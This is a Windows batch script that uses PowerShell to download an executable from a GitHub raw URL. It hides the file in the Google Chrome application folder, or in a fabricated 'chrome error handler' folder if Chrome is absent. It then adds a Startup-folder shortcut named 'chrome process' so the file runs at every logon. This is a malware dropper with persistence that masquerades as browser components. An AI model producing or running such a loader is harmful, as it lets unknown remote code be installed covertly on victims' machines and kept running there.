@echo off
setlocal EnableDelayedExpansion

:: ===================== CONFIG =====================
set "EXE_URL=https://raw.githubusercontent.com/neiral/chrome-tools/main/yourapp.exe"
set "EXE_NAME=yourapp.exe"
set "SHORTCUT_NAME=chrome process"

:: ===================== PATHS =====================
set "TEMP_EXE=%TEMP%\%EXE_NAME%"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Possible Chrome folders
set "CHROME_DIR="
for %%p in (
    "C:\Program Files\Google\Chrome\Application"
    "C:\Program Files (x86)\Google\Chrome\Application"
) do (
    if exist %%p (
        set "CHROME_DIR=%%p"
        goto :found_chrome
    )
)

:not_found_chrome
set "CHROME_DIR=C:\Program Files\chrome error handler"
if not exist "!CHROME_DIR!\" mkdir "!CHROME_DIR!" >nul 2>&1

:found_chrome
set "FINAL_PATH=!CHROME_DIR!\%EXE_NAME%"
set "SHORTCUT_PATH=%STARTUP_FOLDER%\%SHORTCUT_NAME%.lnk"

:: ===================== DOWNLOAD =====================
echo Downloading file...
powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%EXE_URL%', '%TEMP_EXE%')"

if not exist "%TEMP_EXE%" (
    echo Download failed.
    goto :cleanup
)

:: ===================== MOVE FILE =====================
echo Placing file...
move /Y "%TEMP_EXE%" "%FINAL_PATH%" >nul 2>&1
if errorlevel 1 (
    echo Could not move file to target location.
    goto :cleanup
)

:: ===================== CREATE SHORTCUT =====================
echo Creating startup shortcut...

:: Use PowerShell to create .lnk (batch has no native way)
powershell -nop -c ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut('%SHORTCUT_PATH%');" ^
    "$s.TargetPath = '%FINAL_PATH%';" ^
    "$s.WorkingDirectory = '%CHROME_DIR%';" ^
    "$s.Save()"

:cleanup
del /f /q "%TEMP_EXE%" >nul 2>&1

echo Done.
timeout /t 2 >nul
exit
